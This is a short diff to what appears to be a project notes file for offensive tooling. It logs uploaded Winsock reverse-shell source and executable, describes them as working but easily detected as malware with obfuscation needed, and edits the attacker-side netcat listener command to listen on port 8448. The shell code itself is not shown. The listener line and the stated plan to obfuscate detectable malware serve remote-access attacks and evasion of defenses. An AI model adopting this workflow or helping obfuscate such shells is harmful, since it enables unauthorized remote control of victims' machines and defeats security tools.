@@ -8,7 +8,7 @@ Uploaded winsock-tcp-8448.cpp and winsock-tcp-8448.exe
 
     These are working reverse shells, but they are easily detected as malware. Obfuscation needed.
         -to listen for winsock reverse shell as attacker: 
-            $nc -nvlp
+            $nc -nvlp 8448
 
 # 10/16/2024
 Russell:
